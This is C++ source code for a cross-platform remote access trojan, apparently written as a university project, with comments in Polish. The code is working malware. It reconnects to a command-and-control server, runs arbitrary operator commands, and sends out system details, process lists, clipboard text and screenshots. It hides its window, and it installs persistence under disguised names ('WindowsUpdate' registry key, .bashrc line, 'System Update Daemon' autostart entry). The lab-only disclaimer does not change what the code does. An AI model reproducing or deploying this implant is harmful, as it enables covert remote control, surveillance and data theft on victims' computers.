// ============================================================
//  UWAGA: Plik stworzony wyłącznie w celach edukacyjnych.
//  Projekt akademicki — demonstracja technik RAT w izolowanym
//  środowisku laboratoryjnym. Nie używać poza środowiskiem
//  kontrolowanym przez uczelnię.
//
//  Autor:    Borys Gankowski
//  Uczelnia: Uniwersytet Vizja
//  Przedmiot: Projekt zespołowy — RAT malware z serwerem C2
//  Rok akademicki: 2025/2026
//
//  Obsługiwane platformy: Windows (MSVC / MinGW), Linux (GCC/Clang)
//
//  Kompilacja Windows (MSVC):
//    cl /EHsc rat.cpp /link ws2_32.lib gdiplus.lib
//
//  Kompilacja Windows (MinGW):
//    g++ -std=c++17 rat.cpp -o rat.exe -lws2_32 -lgdiplus -mwindows
//
//  Kompilacja Linux (GCC):
//    g++ -std=c++17 rat.cpp -o rat
//    Wymagane narzędzia do screenshotu: scrot lub imagemagick
//    Wymagane narzędzie do schowka:     xclip lub xsel
// ============================================================

// ============================================================
//  KONFIGURACJA
// ============================================================
#define C2_HOST           "0.0.0.0"
#define C2_PORT           4444
#define RECONNECT_DELAY_MS 5000
#define MAGIC_BYTE        0x02
#define END_MARKER        "<<END>>\n"

// ============================================================
//  NAGŁÓWKI — platforma-specyficzne
// ============================================================

#ifdef _WIN32
    // ── Windows ───────────────────────────────────────────
    #ifndef WIN32_LEAN_AND_MEAN
        #define WIN32_LEAN_AND_MEAN
    #endif
    #include <winsock2.h>       // Winsock2 — TCP (musi być przed windows.h)
    #include <ws2tcpip.h>       // inet_pton, getaddrinfo
    #include <windows.h>        // Windows API (rejestr, procesy, schowek, GDI)
    #include <tlhelp32.h>       // CreateToolhelp32Snapshot
    #include <gdiplus.h>        // GDI+ screenshot
    #pragma comment(lib, "ws2_32.lib")
    #pragma comment(lib, "gdiplus.lib")

    // Typ gniazda i stałe zgodne z Winsock
    // (SOCKET, INVALID_SOCKET, SOCKET_ERROR już zdefiniowane przez winsock2.h)

#else
    // ── Linux / POSIX ──────────────────────────────────────
    #include <sys/socket.h>
    #include <netinet/in.h>
    #include <arpa/inet.h>
    #include <netdb.h>
    #include <unistd.h>
    #include <sys/utsname.h>
    #include <sys/types.h>
    #include <sys/stat.h>      // ← DODAJ TEN NAGŁÓWEK (mkdir)
    #include <pwd.h>
    #include <dirent.h>
    #include <cerrno>
    #include <cstring>

    using SOCKET        = int;
    using BYTE          = unsigned char;
    constexpr SOCKET    INVALID_SOCKET = -1;
    constexpr int       SOCKET_ERROR   = -1;
#endif

// ============================================================
//  NAGŁÓWKI STANDARDOWE (obie platformy)
// ============================================================
#include <string>
#include <sstream>
#include <vector>
#include <cstdint>
#include <cstdio>
#include <cstdlib>


// ============================================================
//  FORWARD DECLARATIONS
// ============================================================

SOCKET      connectToC2();
void        mainLoop(SOCKET sock);
std::string handleCommand(const std::string& cmd);

std::string       cmdSysinfo();
std::string       cmdShell(const std::string& command);
std::string       cmdListProcesses();
std::string       cmdClipboard();
bool              cmdPersist();
bool              cmdScreenshot(SOCKET sock);

void              sendResponse(SOCKET sock, const std::string& response);
std::string       recvLine(SOCKET sock);
std::vector<BYTE> captureScreenToJpeg();   // implementacja platform-specific


// ============================================================
//  HELPERY SIECIOWE — wspólne dla obu platform
//  (POSIX i Winsock mają kompatybilne API send/recv/socket)
// ============================================================

// Zamknięcie gniazda — różna nazwa funkcji na Windows i Linux
inline void closeSocket(SOCKET s)
{
#ifdef _WIN32
    closesocket(s);
#else
    ::close(s);
#endif
}


// ============================================================
//  PUNKT WEJŚCIA
// ============================================================

#ifdef _WIN32

// Windows: WinMain — brak okna konsoli
int WINAPI WinMain(
    HINSTANCE /*hInstance*/,
    HINSTANCE /*hPrevInstance*/,
    LPSTR     /*lpCmdLine*/,
    int       /*nCmdShow*/)
{
    // Inicjalizacja Winsock
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0)
        return 1;

    // Inicjalizacja GDI+ (screenshot)
    Gdiplus::GdiplusStartupInput gdiplusStartupInput;
    ULONG_PTR gdiplusToken;
    Gdiplus::GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);

    // Pętla reconnect
    while (true) {
        SOCKET sock = connectToC2();
        if (sock != INVALID_SOCKET) {
            mainLoop(sock);
            closeSocket(sock);
        }
        Sleep(RECONNECT_DELAY_MS);
    }

    Gdiplus::GdiplusShutdown(gdiplusToken);
    WSACleanup();
    return 0;
}

#else

// Linux: zwykły main()
int main()
{
    // Pętla reconnect (sleep w sekundach)
    while (true) {
        SOCKET sock = connectToC2();
        if (sock != INVALID_SOCKET) {
            mainLoop(sock);
            closeSocket(sock);
        }
        sleep(RECONNECT_DELAY_MS / 1000);
    }
    return 0;
}

#endif // _WIN32 (entry point)


// ============================================================
//  connectToC2()
//  Nawiązuje połączenie TCP z serwerem C2.
//  Wysyła magic byte 0x02.
//  Kompatybilne z POSIX i Winsock (identyczne API).
// ============================================================
SOCKET connectToC2()
{
    SOCKET sock = ::socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sock == INVALID_SOCKET) return INVALID_SOCKET;

    sockaddr_in serverAddr{};
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port   = htons(C2_PORT);

    if (inet_pton(AF_INET, C2_HOST, &serverAddr.sin_addr) != 1) {
        closeSocket(sock);
        return INVALID_SOCKET;
    }

    if (::connect(sock, reinterpret_cast<sockaddr*>(&serverAddr),
                  sizeof(serverAddr)) == SOCKET_ERROR) {
        closeSocket(sock);
        return INVALID_SOCKET;
    }

    char magicByte = MAGIC_BYTE;
    if (::send(sock, &magicByte, 1, 0) == SOCKET_ERROR) {
        closeSocket(sock);
        return INVALID_SOCKET;
    }

    return sock;
}


// ============================================================
//  mainLoop()
//  Główna pętla sesji — identyczna logika na obu platformach.
// ============================================================
void mainLoop(SOCKET sock)
{
    // Wyślij automatyczny sysinfo zaraz po połączeniu
    sendResponse(sock, cmdSysinfo());

    while (true) {
        std::string cmd = recvLine(sock);
        if (cmd.empty()) break;  // rozłączenie

        // Usuń CR/LF z końca
        while (!cmd.empty() && (cmd.back() == '\n' || cmd.back() == '\r'))
            cmd.pop_back();

        if (cmd == "exit") break;

        if (cmd == "screenshot") {
            if (!cmdScreenshot(sock))
                sendResponse(sock, "[!] Screenshot failed\n");
            continue;
        }

        sendResponse(sock, handleCommand(cmd));
    }
}


// ============================================================
//  handleCommand() — dispatcher (identyczny na obu platformach)
// ============================================================
std::string handleCommand(const std::string& cmd)
{
    if (cmd == "sysinfo")   return cmdSysinfo();
    if (cmd == "listproc")  return cmdListProcesses();
    if (cmd == "clipboard") return cmdClipboard();
    if (cmd == "persist") {
        return cmdPersist()
            ? "[+] Persistence established\n"
            : "[-] Persistence failed\n";
    }
    if (cmd.substr(0, 6) == "shell ")
        return cmdShell(cmd.substr(6));

    return "[!] Unknown command: " + cmd + "\n";
}


// ============================================================
//  sendResponse() — identyczne API send() na obu platformach
// ============================================================
void sendResponse(SOCKET sock, const std::string& response)
{
    std::string full = response + END_MARKER;
    size_t totalSent = 0;
    size_t len       = full.size();

    while (totalSent < len) {
        int sent = ::send(sock,
            full.c_str() + totalSent,
            static_cast<int>(len - totalSent), 0);
        if (sent <= 0) break;
        totalSent += static_cast<size_t>(sent);
    }
}


// ============================================================
//  recvLine() — identyczne API recv() na obu platformach
// ============================================================
std::string recvLine(SOCKET sock)
{
    std::string line;
    char c;
    while (true) {
        int r = ::recv(sock, &c, 1, 0);
        if (r <= 0) return "";  // błąd lub rozłączenie
        line += c;
        if (c == '\n') break;
    }
    return line;
}


// ╔══════════════════════════════════════════════════════════╗
// ║         IMPLEMENTACJE PLATFORM-SPECIFIC                  ║
// ╚══════════════════════════════════════════════════════════╝

// ============================================================
//  cmdSysinfo()
// ============================================================

#ifdef _WIN32

std::string cmdSysinfo()
{
    std::ostringstream out;
    out << "=== SYSINFO ===\n";

    // Hostname
    char computerName[MAX_COMPUTERNAME_LENGTH + 1] = {};
    DWORD sz = sizeof(computerName);
    out << "Hostname:  "
        << (GetComputerNameA(computerName, &sz) ? computerName : "[BŁĄD]")
        << "\n";

    // Username
    char userName[256] = {};
    DWORD usz = sizeof(userName);
    out << "Username:  "
        << (GetUserNameA(userName, &usz) ? userName : "[BŁĄD]")
        << "\n";

    // OS version (GetVersionEx deprecated od Win 8.1 — PoC)
    OSVERSIONINFOA osInfo{};
    osInfo.dwOSVersionInfoSize = sizeof(osInfo);
    #pragma warning(suppress: 4996)
    GetVersionExA(&osInfo);
    out << "OS:        Windows "
        << osInfo.dwMajorVersion << "." << osInfo.dwMinorVersion
        << " (Build " << osInfo.dwBuildNumber << ")\n";

    // Local IP
    char hostName[256] = {};
    gethostname(hostName, sizeof(hostName));
    addrinfo hints{}, *res = nullptr;
    hints.ai_family = AF_INET;
    if (getaddrinfo(hostName, nullptr, &hints, &res) == 0 && res) {
        char ipStr[INET_ADDRSTRLEN] = {};
        inet_ntop(AF_INET,
            &reinterpret_cast<sockaddr_in*>(res->ai_addr)->sin_addr,
            ipStr, sizeof(ipStr));
        out << "Local IP:  " << ipStr << "\n";
        freeaddrinfo(res);
    } else {
        out << "Local IP:  [BŁĄD]\n";
    }

    // Admin check
    BOOL isAdmin = FALSE;
    SID_IDENTIFIER_AUTHORITY ntAuthority = SECURITY_NT_AUTHORITY;
    PSID adminGroup = nullptr;
    if (AllocateAndInitializeSid(&ntAuthority, 2,
            SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS,
            0, 0, 0, 0, 0, 0, &adminGroup)) {
        CheckTokenMembership(nullptr, adminGroup, &isAdmin);
        FreeSid(adminGroup);
    }
    out << "Admin:     " << (isAdmin ? "YES" : "NO") << "\n";
    out << "===============\n";
    return out.str();
}

#else // Linux

std::string cmdSysinfo()
{
    std::ostringstream out;
    out << "=== SYSINFO ===\n";

    // Hostname
    char hostName[256] = {};
    gethostname(hostName, sizeof(hostName));
    out << "Hostname:  " << hostName << "\n";

    // Username — getpwuid() zwraca strukturę z passwd
    struct passwd* pw = getpwuid(getuid());
    out << "Username:  " << (pw ? pw->pw_name : "[BŁĄD]") << "\n";

    // OS — uname() + /etc/os-release
    struct utsname uts{};
    uname(&uts);
    out << "OS:        " << uts.sysname << " "
        << uts.release << " " << uts.machine << "\n";

    // Local IP — getaddrinfo na hostname
    addrinfo hints{}, *res = nullptr;
    hints.ai_family = AF_INET;
    if (getaddrinfo(hostName, nullptr, &hints, &res) == 0 && res) {
        char ipStr[INET_ADDRSTRLEN] = {};
        inet_ntop(AF_INET,
            &reinterpret_cast<sockaddr_in*>(res->ai_addr)->sin_addr,
            ipStr, sizeof(ipStr));
        out << "Local IP:  " << ipStr << "\n";
        freeaddrinfo(res);
    } else {
        out << "Local IP:  [BŁĄD]\n";
    }

    // Root check (UID == 0)
    out << "Admin:     " << (getuid() == 0 ? "YES (root)" : "NO") << "\n";
    out << "===============\n";
    return out.str();
}

#endif // cmdSysinfo


// ============================================================
//  cmdShell()
// ============================================================

#ifdef _WIN32

std::string cmdShell(const std::string& command)
{
    std::string fullCmd = "cmd.exe /c " + command + " 2>&1";

    HANDLE hRead, hWrite;
    SECURITY_ATTRIBUTES sa{ sizeof(SECURITY_ATTRIBUTES), nullptr, TRUE };
    if (!CreatePipe(&hRead, &hWrite, &sa, 0))
        return "[!] Pipe creation failed\n";

    STARTUPINFOA si{};
    si.cb          = sizeof(si);
    si.hStdOutput  = hWrite;
    si.hStdError   = hWrite;
    si.dwFlags     = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    PROCESS_INFORMATION pi{};
    BOOL ok = CreateProcessA(nullptr,
        const_cast<LPSTR>(fullCmd.c_str()),
        nullptr, nullptr, TRUE, CREATE_NO_WINDOW,
        nullptr, nullptr, &si, &pi);
    CloseHandle(hWrite);

    if (!ok) {
        CloseHandle(hRead);
        return "[!] Process creation failed\n";
    }

    std::string output;
    char buffer[4096];
    DWORD bytesRead;
    while (ReadFile(hRead, buffer, sizeof(buffer) - 1, &bytesRead, nullptr)
           && bytesRead > 0) {
        buffer[bytesRead] = '\0';
        output += buffer;
    }
    WaitForSingleObject(pi.hProcess, 10000);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    CloseHandle(hRead);

    if (output.empty()) output = "(no output)\n";
    return output;
}

#else // Linux

std::string cmdShell(const std::string& command)
{
    // popen() uruchamia powłokę i zwraca pipe do stdout+stderr
    std::string fullCmd = command + " 2>&1";
    FILE* pipe = popen(fullCmd.c_str(), "r");
    if (!pipe) return "[!] popen failed: " + std::string(strerror(errno)) + "\n";

    std::string output;
    char buffer[4096];
    while (fgets(buffer, sizeof(buffer), pipe))
        output += buffer;

    pclose(pipe);
    if (output.empty()) output = "(no output)\n";
    return output;
}

#endif // cmdShell


// ============================================================
//  cmdListProcesses()
// ============================================================

#ifdef _WIN32

std::string cmdListProcesses()
{
    std::ostringstream out;
    out << "=== RUNNING PROCESSES ===\n";
    out << "PID\t\tNAME\n---\t\t----\n";

    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap == INVALID_HANDLE_VALUE)
        return "[!] Failed to create process snapshot\n";

    PROCESSENTRY32 pe{};
    pe.dwSize = sizeof(PROCESSENTRY32);
    if (Process32First(hSnap, &pe)) {
        do {
            out << pe.th32ProcessID << "\t\t" << pe.szExeFile << "\n";
        } while (Process32Next(hSnap, &pe));
    }
    CloseHandle(hSnap);
    out << "=========================\n";
    return out.str();
}

#else // Linux

std::string cmdListProcesses()
{
    // Na Linuksie każdy proces ma katalog /proc/<PID>/
    // Plik /proc/<PID>/comm zawiera nazwę procesu
    std::ostringstream out;
    out << "=== RUNNING PROCESSES ===\n";
    out << "PID\t\tNAME\n---\t\t----\n";

    DIR* procDir = opendir("/proc");
    if (!procDir) return "[!] Cannot open /proc\n";

    struct dirent* entry;
    while ((entry = readdir(procDir)) != nullptr) {
        // Wpisy w /proc to mieszanka numerycznych PID i innych
        // Sprawdzamy czy nazwa to liczba (PID)
        std::string name = entry->d_name;
        bool isNumeric = !name.empty()
            && name.find_first_not_of("0123456789") == std::string::npos;
        if (!isNumeric) continue;

        // Odczytaj nazwę procesu z /proc/<PID>/comm
        std::string commPath = "/proc/" + name + "/comm";
        FILE* f = fopen(commPath.c_str(), "r");
        if (!f) continue;

        char procName[256] = {};
        fgets(procName, sizeof(procName), f);
        fclose(f);

        // Usuń newline z comm
        size_t len = strlen(procName);
        if (len > 0 && procName[len - 1] == '\n') procName[len - 1] = '\0';

        out << name << "\t\t" << procName << "\n";
    }
    closedir(procDir);
    out << "=========================\n";
    return out.str();
}

#endif // cmdListProcesses


// ============================================================
//  cmdClipboard()
// ============================================================

#ifdef _WIN32

std::string cmdClipboard()
{
    if (!OpenClipboard(nullptr))
        return "[!] Cannot open clipboard\n";

    HANDLE hData = GetClipboardData(CF_TEXT);
    if (!hData) {
        CloseClipboard();
        return "[!] No text in clipboard (or unsupported format)\n";
    }

    char* pText = static_cast<char*>(GlobalLock(hData));
    std::string result;
    if (pText) {
        result = "=== CLIPBOARD ===\n";
        result += pText;
        result += "\n=================\n";
        GlobalUnlock(hData);
    } else {
        result = "[!] Failed to lock clipboard data\n";
    }
    CloseClipboard();
    return result;
}

#else // Linux

std::string cmdClipboard()
{
    // Próbuj xclip, potem xsel — standardowe narzędzia X11
    // Wymaga działającego serwera X (DISPLAY ustawione)
    const char* cmds[] = {
        "xclip -selection clipboard -o 2>/dev/null",
        "xsel --clipboard --output 2>/dev/null",
        nullptr
    };

    for (int i = 0; cmds[i]; ++i) {
        FILE* pipe = popen(cmds[i], "r");
        if (!pipe) continue;

        std::string content;
        char buf[4096];
        while (fgets(buf, sizeof(buf), pipe))
            content += buf;
        int ret = pclose(pipe);

        // pclose zwraca status procesu — 0 = sukces
        if (ret == 0 && !content.empty()) {
            return "=== CLIPBOARD ===\n" + content + "\n=================\n";
        }
    }
    return "[!] Clipboard unavailable (brak xclip/xsel lub brak DISPLAY)\n";
}

#endif // cmdClipboard


// ============================================================
//  cmdPersist()
// ============================================================

#ifdef _WIN32

bool cmdPersist()
{
    char exePath[MAX_PATH] = {};
    if (GetModuleFileNameA(nullptr, exePath, MAX_PATH) == 0)
        return false;

    const char* regKeyName = "WindowsUpdate";
    const char* regKeyPath = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";

    HKEY hKey;
    if (RegOpenKeyExA(HKEY_CURRENT_USER, regKeyPath, 0,
                      KEY_SET_VALUE, &hKey) != ERROR_SUCCESS)
        return false;

    LONG result = RegSetValueExA(hKey, regKeyName, 0, REG_SZ,
        reinterpret_cast<const BYTE*>(exePath),
        static_cast<DWORD>(strlen(exePath) + 1));
    RegCloseKey(hKey);
    return (result == ERROR_SUCCESS);
}

#else // Linux

std::string getExePath()
{
    // /proc/self/exe → dowiązanie symboliczne do aktualnego pliku wykonywalnego
    char buf[4096] = {};
    ssize_t len = readlink("/proc/self/exe", buf, sizeof(buf) - 1);
    if (len < 0) return "";
    buf[len] = '\0';
    return std::string(buf);
}

bool cmdPersist()
{
    std::string exePath = getExePath();
    if (exePath.empty()) return false;

    bool ok = false;

    // ── Metoda 1: ~/.bashrc (T1546.004) ──────────────────
    // Dopisuje wpis do .bashrc — uruchamia się przy każdym
    // logowaniu przez powłokę interaktywną
    const char* home = getenv("HOME");
    if (home) {
        std::string bashrc = std::string(home) + "/.bashrc";
        FILE* f = fopen(bashrc.c_str(), "a");
        if (f) {
            // Sprawdź czy wpis już istnieje — uproszczona wersja
            std::string marker = "# sys-update-daemon";
            fprintf(f, "\n%s\nnohup \"%s\" &>/dev/null &\n",
                    marker.c_str(), exePath.c_str());
            fclose(f);
            ok = true;
        }

        // ── Metoda 2: ~/.config/autostart/ (XDG, T1547.013) ──
        // Standardowy mechanizm autostartu środowisk graficznych
        // (GNOME, KDE, XFCE itp.)
        std::string autostartDir = std::string(home) + "/.config/autostart";
        // mkdir -p (uproszczone — tylko jeden poziom)
        mkdir(autostartDir.c_str(), 0700);

        std::string desktopPath = autostartDir + "/sys-update.desktop";
        FILE* df = fopen(desktopPath.c_str(), "w");
        if (df) {
            fprintf(df,
                "[Desktop Entry]\n"
                "Type=Application\n"
                "Name=System Update Daemon\n"
                "Exec=%s\n"
                "Hidden=false\n"
                "NoDisplay=false\n"
                "X-GNOME-Autostart-enabled=true\n",
                exePath.c_str());
            fclose(df);
            ok = true;
        }
    }

    return ok;
}

#endif // cmdPersist


// ============================================================
//  cmdScreenshot() + captureScreenToJpeg()
// ============================================================

#ifdef _WIN32

// Windows: GDI+ screenshot (bez zmian względem oryginału)
std::vector<BYTE> captureScreenToJpeg()
{
    int screenX = GetSystemMetrics(SM_XVIRTUALSCREEN);
    int screenY = GetSystemMetrics(SM_YVIRTUALSCREEN);
    int screenW = GetSystemMetrics(SM_CXVIRTUALSCREEN);
    int screenH = GetSystemMetrics(SM_CYVIRTUALSCREEN);

    HDC hdcScreen = GetDC(nullptr);
    HDC hdcMem    = CreateCompatibleDC(hdcScreen);
    HBITMAP hBmp  = CreateCompatibleBitmap(hdcScreen, screenW, screenH);
    SelectObject(hdcMem, hBmp);
    BitBlt(hdcMem, 0, 0, screenW, screenH, hdcScreen, screenX, screenY, SRCCOPY);

    // Znajdź CLSID encodera JPEG
    CLSID jpegClsid{};
    {
        UINT numEncoders = 0, size = 0;
        Gdiplus::GetImageEncodersSize(&numEncoders, &size);
        std::vector<BYTE> buf(size);
        auto* encoders = reinterpret_cast<Gdiplus::ImageCodecInfo*>(buf.data());
        Gdiplus::GetImageEncoders(numEncoders, size, encoders);
        for (UINT i = 0; i < numEncoders; i++) {
            if (std::wstring(encoders[i].MimeType) == L"image/jpeg") {
                jpegClsid = encoders[i].Clsid;
                break;
            }
        }
    }

    std::vector<BYTE> result;
    IStream* pStream = nullptr;
    if (SUCCEEDED(CreateStreamOnHGlobal(nullptr, TRUE, &pStream))) {
        Gdiplus::Bitmap bitmap(hBmp, nullptr);
        Gdiplus::EncoderParameters params;
        params.Count = 1;
        params.Parameter[0].Guid           = Gdiplus::EncoderQuality;
        params.Parameter[0].Type           = Gdiplus::EncoderParameterValueTypeLong;
        params.Parameter[0].NumberOfValues = 1;
        ULONG quality = 80;
        params.Parameter[0].Value = &quality;
        bitmap.Save(pStream, &jpegClsid, &params);

        STATSTG stat{};
        pStream->Stat(&stat, STATFLAG_NONAME);
        ULONG jpegSize = static_cast<ULONG>(stat.cbSize.QuadPart);
        result.resize(jpegSize);
        LARGE_INTEGER li{};
        pStream->Seek(li, STREAM_SEEK_SET, nullptr);
        pStream->Read(result.data(), jpegSize, nullptr);
        pStream->Release();
    }

    DeleteObject(hBmp);
    DeleteDC(hdcMem);
    ReleaseDC(nullptr, hdcScreen);
    return result;
}

bool cmdScreenshot(SOCKET sock)
{
    std::vector<BYTE> jpegData = captureScreenToJpeg();
    if (jpegData.empty()) return false;

    uint32_t size   = static_cast<uint32_t>(jpegData.size());
    uint32_t sizeBE = htonl(size);
    if (::send(sock, reinterpret_cast<char*>(&sizeBE), 4, 0) == SOCKET_ERROR)
        return false;

    size_t totalSent = 0;
    while (totalSent < size) {
        int sent = ::send(sock,
            reinterpret_cast<char*>(jpegData.data()) + totalSent,
            static_cast<int>(size - totalSent), 0);
        if (sent <= 0) return false;
        totalSent += static_cast<size_t>(sent);
    }
    return true;
}

#else // Linux

std::vector<BYTE> captureScreenToJpeg()
{
    // Zapisz screenshot do pliku tymczasowego przez scrot lub import (ImageMagick)
    // scrot: apt install scrot
    // import: apt install imagemagick
    const char* tmpFile = "/tmp/._rat_screen.jpg";

    // Próbuj scrot, potem import z ImageMagick
    const char* cmds[] = {
        "scrot -q 80 /tmp/._rat_screen.jpg 2>/dev/null",
        "import -window root -quality 80 /tmp/._rat_screen.jpg 2>/dev/null",
        nullptr
    };

    bool captured = false;
    for (int i = 0; cmds[i]; ++i) {
        int ret = system(cmds[i]);
        if (ret == 0) {
            captured = true;
            break;
        }
    }

    std::vector<BYTE> result;
    if (!captured) return result;

    // Wczytaj plik JPEG do wektora
    FILE* f = fopen(tmpFile, "rb");
    if (!f) return result;

    fseek(f, 0, SEEK_END);
    long fileSize = ftell(f);
    fseek(f, 0, SEEK_SET);

    if (fileSize > 0) {
        result.resize(static_cast<size_t>(fileSize));
        fread(result.data(), 1, static_cast<size_t>(fileSize), f);
    }
    fclose(f);

    // Usuń plik tymczasowy
    remove(tmpFile);
    return result;
}

bool cmdScreenshot(SOCKET sock)
{
    std::vector<BYTE> jpegData = captureScreenToJpeg();
    if (jpegData.empty()) return false;

    uint32_t size   = static_cast<uint32_t>(jpegData.size());
    uint32_t sizeBE = htonl(size);
    if (::send(sock, reinterpret_cast<char*>(&sizeBE), 4, 0) < 0)
        return false;

    size_t totalSent = 0;
    while (totalSent < size) {
        ssize_t sent = ::send(sock,
            jpegData.data() + totalSent,
            size - totalSent, 0);
        if (sent <= 0) return false;
        totalSent += static_cast<size_t>(sent);
    }
    return true;
}

#endif // cmdScreenshot